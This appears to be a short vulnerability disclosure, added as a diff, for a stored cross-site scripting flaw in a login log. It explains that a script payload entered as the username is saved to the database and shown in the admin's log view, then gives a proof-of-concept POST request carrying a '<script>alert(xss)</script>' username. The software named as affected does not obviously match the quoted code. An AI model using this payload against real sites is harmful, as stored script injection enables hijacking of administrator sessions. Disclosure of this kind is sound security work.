@@ -1,0 +1,25 @@
+# By 李在堂
+
+'''
+Whether the login succeeds or fails, it will be logged in the log-in log
+Enter the Payload in the username, it will prompt the user name or password is incorrect. 
+Payload has been stored to the database.However, only 40 characters can be recorded
+Log in with the correct account password, log in the background log can be viewed
+Source:
+		StyleController.php:84-90
+            if (false == $userInfo) {
+                $this->record($identifier, $password, 0);
+                return false;
+            }
+            $this->record($identifier, $password, 1);
+    This shows that regardless of login success or failure will log
+
+	Affected software:typecho <=3.1
+	Software Link: https://github.com/xueyuwan/www
+
+'''
+
+exploit:
+127.0.0.1/admin.php?m=Public&a=tologin
+POST 
+username=<script>alert(xss)</script>&password=123456&code=fnd5
